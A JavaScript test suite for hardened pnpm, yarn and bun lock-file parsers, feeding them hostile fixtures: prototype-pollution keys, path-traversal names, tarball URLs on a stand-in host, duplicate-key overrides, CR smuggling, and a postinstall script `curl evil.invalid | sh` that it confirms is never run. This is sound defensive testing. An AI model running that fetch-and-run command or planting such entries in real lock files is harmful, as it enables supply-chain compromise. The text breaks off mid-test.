// @ts-check
// `agent.sh advisory-check` reads pnpm, yarn and bun lock files too (A375, issue 338 C10, extends A373). The lock is untrusted (an agent can write it) and the parsers are a security boundary: they
// read it as DATA only (no package manager runs, no project script or config is read), are bounded and fail closed. Tried here, per format: the real layouts (pnpm lockfileVersion 5, 6 and 9, yarn
// classic and berry, bun's JSON with comments), every entry kind that is not a registry package, hostile names, keys and values (`__proto__`, paths, URLs, control characters, YAML anchors, aliases
// and tags), the size and line bounds, inputs built to make a pattern backtrack, and the command end to end with a FAKE `io.http` (nothing touches the network): the body, the record, the ledger row,
// the binary bun lock refused, more than one root lock refused, a linked lock refused, the counted request set reused, and the validator accepting the new lock names.
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { readFileSync, symlinkSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { test } from 'node:test';
import { cleanEnv } from '../lib/harness.mjs';
import { run as coreRun } from '../../control-plane/agents/scripts/proofline-core.mjs';
import { LOCK_FORMATS, MAX_LINE, MAX_LINES, berryIdent, bunPackages, npmPackages, pnpmIdent, pnpmPackages, registryResolved, stripJsonc, yamlScalar, yarnPackages, yarnSpecName } from '../../control-plane/agents/scripts/core/lockparse.mjs';
import { applyAdvisory } from '../../skills/exploit-proof/scripts/validate-dependencies.mjs';
import { frozen, implement, rrun, sedFile, wr } from './risk-s2-lib.mjs';

/** @param {any} r */
const ok = (r) => { assert.ok(!('error' in r), JSON.stringify(r)); return /** @type {{ packages: Map<string, string[]>, skipped: number, reasons: Record<string, number>, total: number, versions: number }} */ (r); };
/** @param {any} r @param {string} kind @param {RegExp} [msg] */
const refused = (r, kind, msg) => { assert.ok('error' in r, JSON.stringify(r && r.packages ? [...r.packages] : r)); assert.equal(r.kind, kind, r.error); if (msg) assert.match(r.error, msg); };
/** @param {ReturnType<typeof ok>} r */
const pk = (r) => Object.fromEntries(r.packages);
/** @param {ReturnType<typeof ok>} r */
const why = (r) => ({ ...r.reasons });
const clean = () => { assert.equal(/** @type {any} */ ({}).polluted, undefined); assert.equal(/** @type {any} */ ({}).version, undefined); assert.equal(Object.getPrototypeOf({}), Object.prototype); };

const PNPM9 = `lockfileVersion: '9.0'

settings:
  autoInstallPeers: true
  excludeLinksFromLockfile: false

importers:

  .:
    dependencies:
      lodash:
        specifier: ^4.17.21
        version: 4.17.21

packages:

  '@babel/code-frame@7.22.13':
    resolution: {integrity: sha512-XktuhWlJ5g+3TJXc5upd9Ks1HutSArik6jf2eAjYFyIOf4ej3RN+184cZbzDvbPnuTJIUhPKKJE3cIsYTiAT3w==}
    engines: {node: '>=6.9.0'}

  lodash@4.17.21:
    resolution: {integrity: sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg==}

  react-dom@18.2.0:
    resolution: {integrity: sha512-6IMTriUmvsjHUjNtEDudZfuDQUoWXVxKHhlEGSk81n4YFS+r/Kl99wXiwlVXtPBtJenozv2P+hxDsw9eA7Xo6g==}
    peerDependencies:
      react: ^18.2.0

  tarball-dep@https://codeload.github.com/o/r/tar.gz/abc:
    resolution: {tarball: https://codeload.github.com/o/r/tar.gz/abc}
    version: 1.0.0

  custom-tarball@1.0.0:
    resolution: {integrity: sha512-x, tarball: https://evil.invalid/x.tgz}

  gitdep@git+https://github.com/o/r.git#abc:
    resolution: {commit: abc, repo: https://github.com/o/r.git, type: git}
    version: 1.0.0

  localdir@file:../local:
    resolution: {directory: ../local, type: directory}

snapshots:

  '@babel/code-frame@7.22.13': {}

  lodash@4.17.21: {}
`;

test('pnpm lockfileVersion 9: registry packages from `packages:` (quoted scoped keys), tarball, git and directory resolutions skipped as non-registry, importers and snapshots never read', () => {
  const r = ok(pnpmPackages(PNPM9));
  assert.deepEqual(pk(r), { '@babel/code-frame': ['7.22.13'], lodash: ['4.17.21'], 'react-dom': ['18.2.0'] });
  assert.equal(r.total, 7); assert.equal(r.skipped, 4);
  assert.deepEqual(why(r), { 'non-registry': 4 });
  // the same text with CRLF line ends reads the same; a byte order mark is refused (the whole-file allowlist)
  assert.deepEqual(pk(ok(pnpmPackages(PNPM9.replace(/\n/g, '\r\n')))), pk(r));
  refused(pnpmPackages(`\ufeff${PNPM9}`), 'lock_unreadable', /printable ASCII/);
  assert.deepEqual(pk(ok(pnpmPackages(Buffer.from(PNPM9)))), pk(r));
});

test('pnpm lockfileVersion 6 and 5: the slash keys, peer suffixes in parentheses (6) and after an underscore (5), scoped names, and a block-form resolution', () => {
  const v6 = `lockfileVersion: '6.0'

packages:

  /@babel/core@7.22.0:
    resolution: {integrity: sha512-a}
    dev: true

  /react-dom@18.2.0(react@18.2.0)(@types/react@18.0.1):
    resolution: {integrity: sha512-b}

  /block@1.0.0:
    resolution:
      integrity: sha512-c

  /block-tarball@1.0.0:
    resolution:
      integrity: sha512-c
      tarball: https://evil.invalid/x.tgz

  /noresolution@1.0.0:
    dev: false
`;
  const r6 = ok(pnpmPackages(v6));
  assert.deepEqual(pk(r6), { '@babel/core': ['7.22.0'], block: ['1.0.0'], 'react-dom': ['18.2.0'] });
  assert.deepEqual(why(r6), { 'non-registry': 2 });
  const v5 = `lockfileVersion: 5.4

specifiers:
  lodash: ^4.17.21

packages:

  /@emotion/react/11.10.5_iapumuv4e6jcjznwuxpf4tt22e:
    resolution: {integrity: sha512-a}

  /lodash/4.17.21:
    resolution: {integrity: sha512-b}

  /lodash/4.17.20:
    resolution: {integrity: sha512-c}

  registry.example.com/x/1.0.0:
    resolution: {integrity: sha512-d}
`;
  const r5 = ok(pnpmPackages(v5));
  assert.deepEqual(pk(r5), { '@emotion/react': ['11.10.5'], lodash: ['4.17.20', '4.17.21'] });
  assert.deepEqual(why(r5), { invalid: 1 }, 'a key with a registry host is not a package name');
  assert.equal(r5.versions, 3);
  assert.deepEqual(pnpmIdent('/@a/b@1.0.0(@c/d@2.0.0)', 6), { name: '@a/b', version: '1.0.0' });
  assert.deepEqual(pnpmIdent('@a/b@1.0.0', 9), { name: '@a/b', version: '1.0.0' });
  assert.deepEqual(pnpmIdent('/@a/b/1.0.0_x@1', 5), { name: '@a/b', version: '1.0.0' });
  assert.equal(pnpmIdent('nover', 9), null); assert.equal(pnpmIdent('@scopeonly', 9), null); assert.equal(pnpmIdent('/x', 5), null);
});

test('pnpm: several YAML documents are all read with one lockfileVersion; a missing, unknown or contradicting version is refused, never clean', () => {
  const two = `---\nlockfileVersion: '9.0'\n\npackages:\n\n  pnpm@9.0.0:\n    resolution: {integrity: sha512-a}\n\n---\nlockfileVersion: '9.0'\n\npackages:\n\n  lodash@4.17.21:\n    resolution: {integrity: sha512-b}\n`;
  assert.deepEqual(pk(ok(pnpmPackages(two))), { lodash: ['4.17.21'], pnpm: ['9.0.0'] });
  refused(pnpmPackages(two.replace("'9.0'", "'6.0'")), 'lock_unsupported', /different lockfileVersions/);
  refused(pnpmPackages('packages:\n\n  lodash@4.17.21:\n    resolution: {integrity: sha512-b}\n'), 'lock_unsupported', /no lockfileVersion/);
  for (const v of ["'4.0'", "'10.0'", 'abc', "'9.0.1'", '[9]']) refused(pnpmPackages(`lockfileVersion: ${v}\n`), 'lock_unsupported');
  for (const v of ['"9.0', '*a', '&a 9.0']) refused(pnpmPackages(`lockfileVersion: ${v}\n`), 'lock_unreadable', /strict subset/);
  assert.deepEqual(pk(ok(pnpmPackages("lockfileVersion: '9.0'\npackages: {}\n"))), {}, 'an empty packages map is read as empty');
});

test('pnpm hostile input: names and keys that fail the grammar are skipped, YAML features outside the subset refuse the lock, nothing reaches the prototype', () => {
  const hostile = `lockfileVersion: '9.0'

packages:

  __proto__@1.0.0:
    resolution: {integrity: sha512-a}

  constructor@1.0.0:
    resolution: {integrity: sha512-a}

  ../../etc@1.0.0:
    resolution: {integrity: sha512-a}

  https://evil.invalid/x@1.0.0:
    resolution: {integrity: sha512-a}

  x y@1.0.0:
    resolution: {integrity: sha512-a}

  badver@latest:
    resolution: {integrity: sha512-a}

  nested@1.0.0:
    resolution: {integrity: {x: y}}

  weirdkey@1.0.0:
    resolution: {integ rity: x}

  '@ok/fine@2.0.0':
    resolution: {integrity: sha512-a}
`;
  const r = ok(pnpmPackages(hostile));
  assert.deepEqual(pk(r), { '@ok/fine': ['2.0.0'], constructor: ['1.0.0'] });
  assert.deepEqual(why(r), { invalid: 5, 'non-registry': 2 });
  assert.ok(r.packages instanceof Map);
  clean();
  const base = "lockfileVersion: '9.0'\n\npackages:\n\n";
  for (const [entry, re] of /** @type {Array<[string, RegExp]>} */ ([
    ['  !!str lodash@1.0.0:\n    resolution: {integrity: x}\n', /strict subset/],
    ['  &x lodash@1.0.0:\n    resolution: {integrity: x}\n', /strict subset/],
    ['  ? lodash@1.0.0\n  : {}\n', /strict subset/],
    ['  anchored@1.0.0:\n    resolution: &a {integrity: x}\n', /strict subset/],
    ['  aliased@1.0.0:\n    resolution: *a\n', /strict subset/],
    ['  flowalias@1.0.0:\n    resolution: {integrity: *a}\n', /strict subset/],
    ['  - lodash@1.0.0\n', /not `<key>:`/],
    ['  lodash@1.0.0: {resolution: {integrity: x}}\n', /not `<key>:`/],
    ['  "lo\\u0064ash@1.0.0":\n    resolution: {integrity: x}\n', /double-quoted key with an escape/],
    ["  'it''s@1.0.0':\n    resolution: {integrity: x}\n", /not `<key>:`/],
    ['   lodash@1.0.0:\n', /odd indentation/],
    ['    resolution: {integrity: x}\n', /a field without an entry/],
  ])) refused(pnpmPackages(base + entry), 'lock_unreadable', re);
  refused(pnpmPackages(`${base}  lodash@1.0.0:\n\tresolution: {integrity: x}\n`), 'lock_unreadable', /tab/);
  refused(pnpmPackages(`${base}  lodash@1.0.0:\n    resolution: {integrity: x}\u0000\n`), 'lock_unreadable', /NUL/);
  refused(pnpmPackages(`${base}  ${'a'.repeat(MAX_LINE)}@1.0.0:\n`), 'lock_unreadable', /longer than 16384/);
  refused(pnpmPackages(`lockfileVersion: '9.0'${'\n'.repeat(MAX_LINES)}`), 'lock_unreadable', /more than 1000000 lines/);
  refused(pnpmPackages('lockfileVersion: 9.0\nnot a yaml pair\n'), 'lock_unreadable', /strict subset/);
});

test('a scalar that spans lines refuses the lock: it could make a later line look like a new top-level key and hide every entry after it (re-review of PR 362)', () => {
  // RED before the fix: the closing line `x: y"` at column 0 ended the packages section, lodash was dropped uncounted and the record said measured
  const first = "lockfileVersion: '9.0'\n\npackages:\n\n  left-pad@1.3.0:\n    resolution: {integrity: sha512-a}\n";
  const rest = '\n  lodash@4.17.15:\n    resolution: {integrity: sha512-b}\n\nsnapshots:\n\n  lodash@4.17.15: {}\n';
  for (const mid of ['    deprecated: "use\nx: y"\n', "    deprecated: 'use\nx: y'\n", '    deprecated: |\n      use\nx: y\n', '    deprecated: >-\n      use\nx: y\n', '    deprecated: use\n      more words\n', '    engines: {node: ">=6\nx: y"}\n', '    os: [darwin,\n      linux]\n', '    deprecated: "a" # c\n']) {
    refused(pnpmPackages(first + mid + rest), 'lock_unreadable', /line [78]: a line outside the strict subset/);
  }
  assert.deepEqual(pk(ok(pnpmPackages(`${first}    deprecated: "use \\"x\\": y"\n    note: 'it''s'\n${rest}`))), { 'left-pad': ['1.3.0'], lodash: ['4.17.15'] }, 'closed quotes with escapes stay readable');
  // yarn berry is YAML too, and a yarn classic string must close on its line
  refused(yarnPackages('__metadata:\n  version: 6\n\n"a@npm:1":\n  resolution: "a@npm:1.0.0\nb@npm:1": x\n'), 'lock_unreadable', /line 5: a line outside the strict subset/);
  refused(yarnPackages('__metadata:\n  version: 6\n\n"a@npm:1":\n  resolution: |\n    a@npm:1.0.0\n'), 'lock_unreadable', /strict subset/);
  refused(yarnPackages('# yarn lockfile v1\n\na@^1:\n  version "1.0.0\nb@^1:\n  version "2"\n'), 'lock_unreadable', /line 4: a line outside the strict subset/);
  // bun is JSON: a string cannot hold a raw line break
  refused(bunPackages('{"lockfileVersion": 1, "packages": {"a": ["a@1.0.0\n", ""]}}'), 'lock_unreadable');
});

test('the whole-file allowlist: only printable ASCII and LF (a CR only in a CRLF pair); a lone CR, U+0085, U+2028, U+2029, a tab, a BOM, control and non-ASCII characters refuse a pnpm or yarn lock (third review of PR 362)', () => {
  // RED before the fix (the PoC): a lone CR is a line break to YAML but not to the line splitter, so the lodash entry sat inside the `hasBin:` line and was never counted, and the record said measured
  const pnpm = ["lockfileVersion: '9.0'", 'packages:', '  ms@2.1.3:', '    resolution: {integrity: sha512-aaa}', '    hasBin:\r  lodash@4.17.20:\r    resolution:\r      integrity: sha512-bbb', 'snapshots:', '  ms@2.1.3: {}', ''].join('\n');
  refused(pnpmPackages(pnpm), 'lock_unreadable', /printable ASCII, LF or a CRLF line end/);
  const berry = ['__metadata:', '  version: 8', '', '"ms@npm:2.1.3":', '  version: 2.1.3', '  resolution: "ms@npm:2.1.3"', '  bin:\rlodash@npm:4.17.20:\r  resolution: lodash@npm:4.17.20', '  languageName: node', ''].join('\n');
  refused(yarnPackages(berry), 'lock_unreadable', /printable ASCII/);
  const base = { pnpm: "lockfileVersion: '9.0'\npackages:\n  ms@2.1.3:\n    resolution: {integrity: sha512-a}\n    deprecated: 'X'\n", berry: '__metadata:\n  version: 8\n"ms@npm:2.1.3":\n  resolution: "ms@npm:2.1.3"\n  conditions: X\n', classic: '# yarn lockfile v1\nms@^2:\n  version "2.1.3"\n  resolved "https://registry.yarnpkg.com/ms/-/ms-2.1.3.tgz"\n  note "X"\n' };
  for (const [fmt, text] of Object.entries(base)) {
    const parse = fmt === 'pnpm' ? pnpmPackages : yarnPackages;
    assert.equal(ok(parse(text.replace('X', 'plain'))).packages.size, 1, fmt);
    assert.equal(ok(parse(text.replace('X', 'plain').replace(/\n/g, '\r\n'))).packages.size, 1, `${fmt} CRLF`);
    for (const ch of ['\r', '\u0085', '\u2028', '\u2029', '\t', '\ufeff', '\u0000', '\u000b', '\u000c', '\u001b', '\u007f', '\u00a0', '\u00e9', '\u{1f600}', '\ufffd']) {
      refused(parse(text.replace('X', `a${ch}b`)), 'lock_unreadable', /printable ASCII/);
    }
    refused(parse(Buffer.concat([Buffer.from(text.replace('X', 'a')), Buffer.from([0xc3, 0x28])])), 'lock_unreadable', /printable ASCII/);
    refused(parse(`${text.replace('X', 'a').replace(/\n/g, '\r\n')}\r`), 'lock_unreadable', /printable ASCII/);
  }
});

test('YAML structure the subset does not read refuses the lock: document end markers, directives, complex keys, duplicate keys, merge keys, keys with `: ` (third review of PR 362)', () => {
  const v = "lockfileVersion: '9.0'\n";
  const e = (/** @type {string} */ k, r = '{integrity: sha512-a}') => `  ${k}:\n    resolution: ${r}\n`;
  // several documents with `---` are read (pnpm 10 writes an env document first), each with its own keys; `...` and `---` with content are refused
  assert.equal(ok(pnpmPackages(`---\n${v}packages:\n${e('a@1.0.0')}---\n${v}packages:\n${e('a@1.0.0')}`)).packages.size, 1);
  refused(pnpmPackages(`${v}packages:\n${e('a@1.0.0')}...\n`), 'lock_unreadable', /document end marker/);
  refused(pnpmPackages(`--- !!map\n${v}`), 'lock_unreadable', /strict subset/);
  refused(pnpmPackages(`%YAML 1.2\n---\n${v}`), 'lock_unreadable', /strict subset/);
  refused(pnpmPackages(`%TAG ! tag:x,2000:\n${v}`), 'lock_unreadable', /strict subset/);
  refused(pnpmPackages(`? packages\n: {}\n${v}`), 'lock_unreadable', /strict subset/);
  // a key twice in one mapping (YAML readers disagree on which wins; js-yaml refuses): top level, package keys (plain and quoted spellings of one key), fields, a flow resolution
  refused(pnpmPackages(`${v}packages:\n${e('a@1.0.0')}snapshots: {}\npackages:\n${e('evil@6.6.6')}`), 'lock_unreadable', /the key "packages" twice/);
  refused(pnpmPackages(`${v}${v}packages: {}\n`), 'lock_unreadable', /"lockfileVersion" twice/);
  refused(pnpmPackages(`${v}packages:\n${e('a@1.0.0')}${e("'a@1.0.0'", '{tarball: https://evil.invalid/x.tgz}')}`), 'lock_unreadable', /the key "a@1.0.0" twice/);
  refused(pnpmPackages(`${v}packages:\n${e("'b@1.0.0'")}${e('"b@1.0.0"')}`), 'lock_unreadable', /the key "b@1.0.0" twice/);
  refused(pnpmPackages(`${v}packages:\n${e('a@1.0.0')}    resolution: {tarball: https://evil.invalid/x.tgz}\n`), 'lock_unreadable', /"resolution" twice/);
  refused(pnpmPackages(`${v}packages:\n  a@1.0.0:\n    resolution:\n      integrity: x\n      integrity: y\n`), 'lock_unreadable', /"integrity" twice/);
  refused(pnpmPackages(`${v}packages:\n${e('a@1.0.0', '{integrity: x, integrity: y}')}`), 'lock_unreadable', /twice in the flow map/);
  // the same key under two different parents is fine
  assert.equal(ok(pnpmPackages(`${v}packages:\n${e('a@1.0.0')}${e('b@1.0.0')}`)).packages.size, 2);
  // merge keys and escaped double-quoted keys are refused, a plain key with `: ` is not a key at all, a quoted one is a key that fails the name grammar
  refused(pnpmPackages(`${v}packages:\n  a@1.0.0:\n    <<: {resolution: {integrity: x}}\n`), 'lock_unreadable', /merge key/);
  refused(pnpmPackages(`${v}packages:\n${e('"a\\u0040b@1.0.0"')}`), 'lock_unreadable', /merge key `<<` or a double-quoted key with an escape/);
  refused(pnpmPackages(`${v}packages:\n  a: b@1.0.0:\n    resolution: {integrity: x}\n`), 'lock_unreadable', /strict subset/);
  assert.deepEqual(why(ok(pnpmPackages(`${v}packages:\n${e("'a: b@1.0.0'")}`))), { invalid: 1 });
  // yarn berry: the same rules; yarn classic: an entry or a field twice
  const m = '__metadata:\n  version: 8\n';
  const b = (/** @type {string} */ k, r = 'a@npm:1.0.0') => `"${k}":\n  resolution: "${r}"\n`;
  refused(yarnPackages(`${m}${b('a@npm:^1')}${b('a@npm:^1', 'evil@npm:6.6.6')}`), 'lock_unreadable', /the key "a@npm:\^1" twice/);
  refused(yarnPackages(`${m}${b('a@npm:^1')}  resolution: "evil@npm:6.6.6"\n`), 'lock_unreadable', /"resolution" twice/);
  refused(yarnPackages(`${m}${m}`), 'lock_unreadable', /"__metadata" twice/);
  refused(yarnPackages(`${m}"a@npm:^1":\n  <<: {resolution: "a@npm:1.0.0"}\n`), 'lock_unreadable', /merge key/);
  refused(yarnPackages(`---\n${m}`), 'lock_unreadable', /strict subset/);
  const c = '# yarn lockfile v1\n';
  const ce = (/** @type {string} */ h, ver = '1.0.0') => `${h}:\n  version "${ver}"\n  resolved "https://registry.yarnpkg.com/a/-/a-${ver}.tgz"\n`;
  refused(yarnPackages(`${c}${ce('a@^1')}${ce('a@^1', '9.9.9')}`), 'lock_unreadable', /an entry twice/);
  refused(yarnPackages(`${c}${ce('"a@^1", "a@^2"')}${ce('a@^2, a@^1', '9.9.9')}`), 'lock_unreadable', /an entry twice/);
  refused(yarnPackages(`${c}${ce('a@^1')}  version "9.9.9"\n`), 'lock_unreadable', /the field version twice/);
});

test('yarn classic: specs and aliases give the real name, the resolved url must be a registry tarball, a missing version or disagreeing specs are skipped', () => {
  const classic = `# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.
# yarn lockfile v1


"@babel/code-frame@^7.0.0", "@babel/code-frame@^7.10.4":
  version "7.12.13"
  resolved "https://registry.yarnpkg.com/@babel/code-frame/-/code-frame-7.12.13.tgz#dcfc826beef65e75c50e21d3837d7d95798dd658"
  integrity sha512-HV1Cm0Q3ZrpCR93tkWOYiuYIgLxZXZFVG2VgK+MBWjUqZTundupbfx2aXarXuw5Ko5aMcjtJgbSs4vUGBS5v6g==
  dependencies:
    "@babel/highlight" "^7.12.13"

lodash@^4.17.20, lodash@^4.17.21:
  version "4.17.21"
  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#679591c564c3bffaae8454cf0b3df370c3d6911c"

"string-width-cjs@npm:string-width@^4.2.0":
  version "4.2.3"
  resolved "https://registry.yarnpkg.com/string-width/-/string-width-4.2.3.tgz#269c7117d27b05ad2e536830a8ec895ef9c6d010"

"gitdep@git+https://github.com/o/r.git#abc":
  version "1.0.0"
  resolved "git+https://github.com/o/r.git#abc"

"tarball@https://codeload.github.com/o/r/tar.gz/abc":
  version "1.0.0"
  resolved "https://codeload.github.com/o/r/tar.gz/abc"

"local@file:../local":
  version "1.0.0"

http-dep@^1.0.0:
  version "1.0.0"
  resolved "http://registry.yarnpkg.com/http-dep/-/http-dep-1.0.0.tgz"

nover@^1.0.0:
  resolved "https://registry.yarnpkg.com/nover/-/nover-1.0.0.tgz"

a@^1.0.0, b@^1.0.0:
  version "1.0.0"
  resolved "https://registry.yarnpkg.com/a/-/a-1.0.0.tgz"

__proto__@^1.0.0:
  version "1.0.0"
  resolved "https://registry.yarnpkg.com/__proto__/-/__proto__-1.0.0.tgz"

"quoted@^1":
  version "1.0.0\\""
  resolved "https://registry.yarnpkg.com/quoted/-/quoted-1.0.0.tgz"
`;
  const r = ok(yarnPackages(classic));
  assert.deepEqual(pk(r), { '@babel/code-frame': ['7.12.13'], lodash: ['4.17.21'], 'string-width': ['4.2.3'] });
  assert.deepEqual(why(r), { invalid: 2, 'no-version': 2, 'non-registry': 4 });
  assert.equal(r.total, 11);
  assert.ok(!r.packages.has('string-width-cjs'), 'the alias name is never asked about');
  clean();
  assert.equal(yarnSpecName('@s/x@^1'), '@s/x'); assert.equal(yarnSpecName('a@npm:@s/b@^2'), '@s/b'); assert.equal(yarnSpecName('a@npm:b'), 'b'); assert.equal(yarnSpecName('noat'), null); assert.equal(yarnSpecName('@scopeonly'), null);
});

test('yarn berry: names and versions from `resolution`, a patch of a registry package counts as it, workspaces are the project itself, every other protocol is non-registry', () => {
  const berry = `# This file is generated by running "yarn install" inside your project.
# Manual changes might be lost - proceed with caution!

__metadata:
  version: 6
  cacheKey: 8

"@babel/code-frame@npm:^7.0.0, @babel/code-frame@npm:^7.10.4":
  version: 7.12.13
  resolution: "@babel/code-frame@npm:7.12.13"
  dependencies:
    "@babel/highlight": ^7.12.13
  checksum: 471532bb7cf4224adf5a0d0e3fb16d45d3a2a7f6a4e9c7a3b6e5d0a1b2c3d4e5
  languageName: node
  linkType: hard

"resolve@npm:^1.22.1":
  version: 1.22.1
  resolution: "resolve@npm:1.22.1"
  languageName: node
  linkType: hard

"resolve@patch:resolve@^1.22.1#~builtin<compat/resolve>":
  version: 1.22.1
  resolution: "resolve@patch:resolve@npm%3A1.22.1#~builtin<compat/resolve>::version=1.22.1&hash=c3c19d"
  languageName: node
  linkType: hard

"typescript@patch:typescript@npm%3A^5.0.0#optional!builtin<compat/typescript>":
  version: 5.3.3
  resolution: "typescript@patch:typescript@npm%3A5.3.3#optional!builtin<compat/typescript>::version=5.3.3&hash=e012d7"

"evil@patch:other@npm%3A1.0.0#./x.patch":
  version: 1.0.0
  resolution: "evil@patch:other@npm%3A1.0.0#./x.patch::locator=app%40workspace%3A."

"string-width-cjs@npm:string-width@^4.2.0":
  version: 4.2.3
  resolution: "string-width@npm:4.2.3"

"app@workspace:.":
  version: 0.0.0-use.local
  resolution: "app@workspace:."
  languageName: unknown
  linkType: soft

"gitdep@https://github.com/o/r.git#commit=abc":
  version: 1.0.0
  resolution: "gitdep@https://github.com/o/r.git#commit=abc"

"lnk@link:../x::locator=app%40workspace%3A.":
  version: 0.0.0-use.local
  resolution: "lnk@link:../x::locator=app%40workspace%3A."

"archive@npm:1.0.0::__archiveUrl=https%3A%2F%2Fevil.invalid%2Fx.tgz":
  version: 1.0.0
  resolution: "archive@npm:1.0.0::__archiveUrl=https%3A%2F%2Fevil.invalid%2Fx.tgz"

"noresolution@npm:^1":
  version: 1.0.0

"escaped@npm:^1":
  version: 1.0.0
  resolution: "esc\\u0061ped@npm:1.0.0"
`;
  const r = ok(yarnPackages(berry));
  assert.deepEqual(pk(r), { '@babel/code-frame': ['7.12.13'], resolve: ['1.22.1'], 'string-width': ['4.2.3'], typescript: ['5.3.3'] });
  assert.deepEqual(why(r), { invalid: 1, 'non-registry': 5 });
  assert.equal(r.total, 11, 'the __metadata entry and the workspace are not counted');
  assert.deepEqual(berryIdent('@s/x@npm:1.0.0'), { kind: 'npm', name: '@s/x', version: '1.0.0' });
  assert.deepEqual(berryIdent('x@workspace:packages/x'), { kind: 'workspace' });
  assert.deepEqual(berryIdent('x@patch:y@npm%3A1.0.0#p'), { kind: 'other' });
  assert.deepEqual(berryIdent('x@patch:x@patch:x@npm%3A1.0.0#p'), { kind: 'other' }, 'a patch of a patch is not followed');
  assert.deepEqual(berryIdent('@nover'), { kind: 'other' });
});

test('yarn: the format is told by the lock itself; neither or both markers, odd indentation, a field without an entry or a bad entry line refuse the lock', () => {
  refused(yarnPackages('lodash@^4:\n  version "4.17.21"\n'), 'lock_unsupported', /neither a yarn classic lock/);
  refused(yarnPackages('# yarn lockfile v1\n__metadata:\n  version: 6\n'), 'lock_unsupported');
  refused(yarnPackages('# yarn lockfile v1\n  version "1.0.0"\n'), 'lock_unreadable', /field without an entry/);
  refused(yarnPackages('# yarn lockfile v1\nlodash@^4:\n   version "1.0.0"\n'), 'lock_unreadable', /odd indentation/);
  refused(yarnPackages('# yarn lockfile v1\nlodash@^4 no colon\n'), 'lock_unreadable', /does not end with/);
  refused(yarnPackages('# yarn lockfile v1\nlodash@^4:\n\tversion "1.0.0"\n'), 'lock_unreadable', /tab/);
  refused(yarnPackages(`# yarn lockfile v1\n"${'a'.repeat(MAX_LINE)}@^1":\n`), 'lock_unreadable', /longer than/);
});

const BUN = `{
  // bun writes JSON with trailing commas; comments are allowed too
  "lockfileVersion": 1,
  "workspaces": {
    "": {
      "name": "app",
      "dependencies": {
        "lodash": "^4.17.21",
      },
    },
    "packages/ws": { "name": "ws-pkg", },
  },
  /* the packages: key -> [ident, registry, info, integrity] */
  "packages": {
    "lodash": ["lodash@4.17.21", "", {}, "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg=="],
    "@types/node": ["@types/node@20.11.0", "", { "dependencies": { "undici-types": "~5.26.4" } }, "sha512-a"],
    "a/lodash": ["lodash@3.10.1", "", {}, "sha512-b"],
    "alias": ["string-width@4.2.3", "", {}, "sha512-c"],
    "private": ["@corp/x@1.0.0", "https://npm.corp.example/", {}, "sha512-d"],
    "ws-pkg": ["ws-pkg@workspace:packages/ws"],
    "gh": ["gh@github:owner/repo#abc", {}, "owner-repo-abc"],
    "tar": ["tar@https://evil.invalid/x.tgz", {}],
    "local": ["local@file:../local", {}],
    "lnk": ["lnk@link:lnk", {}],
    "insecure": ["insecure@1.0.0", "http://evil.invalid/", {}, "sha512-e"],
    "badver": ["badver@latest", "", {}, "sha512-f"],
    "proto": ["__proto__@1.0.0", "", {}, "sha512-g"],
    "__proto__": ["constructor@1.0.0", "", {}, "sha512-h"],
    "notarray": { "0": "x@1.0.0" },
    "empty": [],
    "number": [7, ""],
    "noat": ["noat", ""],
    "one": ["one@1.0.0"],
    "url": ["u@1.0.0", "https://evil.invalid/x?a=b", {}],
  },
}
`;

test('bun.lock: JSON with comments and trailing commas; registry entries by their ident, workspaces not counted, git, github, file, link, tarball and http registries are non-registry', () => {
  const r = ok(bunPackages(BUN));
  assert.deepEqual(pk(r), { '@corp/x': ['1.0.0'], '@types/node': ['20.11.0'], constructor: ['1.0.0'], lodash: ['3.10.1', '4.17.21'], 'string-width': ['4.2.3'], u: ['1.0.0'] });
  assert.deepEqual(why(r), { invalid: 6, 'non-registry': 6 });
  assert.equal(r.total, 19, 'the workspace entry is not counted');
  clean();
  refused(bunPackages(BUN.replace('"lockfileVersion": 1', '"lockfileVersion": 2')), 'lock_unsupported', /lockfileVersion 0 or 1/);
  refused(bunPackages('{"lockfileVersion": 1}'), 'lock_unsupported', /no `packages` map/);
  refused(bunPackages('{"lockfileVersion": 1, "packages": []}'), 'lock_unsupported');
  refused(bunPackages('{"lockfileVersion": 1, "packages": {} /* open'), 'lock_unreadable', /unterminated/);
  refused(bunPackages('{"lockfileVersion": 1, "packages": {"a": ["a@1.0.0]}}'), 'lock_unreadable', /unterminated/);
  refused(bunPackages('{"lockfileVersion": 1, "packages": {,,}}'), 'lock_unreadable', /not valid JSON/);
  refused(bunPackages('[]'), 'lock_unreadable'); refused(bunPackages('null'), 'lock_unreadable');
  assert.deepEqual(pk(ok(bunPackages(`﻿{"lockfileVersion": 0, "packages": {"a": ["a@1.0.0", ""]}}`))), { a: ['1.0.0'] });
  assert.deepEqual(pk(ok(bunPackages(`{"lockfileVersion": 1, "packages": {"a": ["a@1.0.0", "", {"postinstall": "curl evil.invalid | sh"}]}}`))), { a: ['1.0.0'] }, 'a script is data, never run');
});

test('stripJsonc: comment markers inside strings and escaped quotes are kept, comments and trailing commas go, one linear pass', () => {
  const s = stripJsonc('{"a": "x // y /* z */", "q": "a\\"//b", /* c */ "b": [1, 2, /* d */], // t\n "c": {"d": 1,},}');
  assert.deepEqual(JSON.parse(/** @type {string} */ (s)), { a: 'x // y /* z */', q: 'a"//b', b: [1, 2], c: { d: 1 } });
  assert.equal(stripJsonc('{"a": 1}'), '{"a": 1}');
  assert.equal(stripJsonc('"open'), null); assert.equal(stripJsonc('/* open'), null); assert.equal(stripJsonc('"\\'), null);
  assert.equal(stripJsonc('[1, // line comment at the end'), '[1,  ');
  // a megabyte of commas, quotes and comment openers is one pass, not a quadratic scan
  const t0 = Date.now();
  stripJsonc(`[${',/**/'.repeat(200000)}]`); stripJsonc(`[${'"\\\\",'.repeat(200000)}]`);
  assert.ok(Date.now() - t0 < 5000, `took ${Date.now() - t0} ms`);
});

test('bounded patterns: hostile long lines and values finish fast and are refused or skipped, never matched by backtracking', () => {
  const t0 = Date.now();
  // a resolved url built to make the tarball pattern backtrack: over the 4096 bound it is not even tried
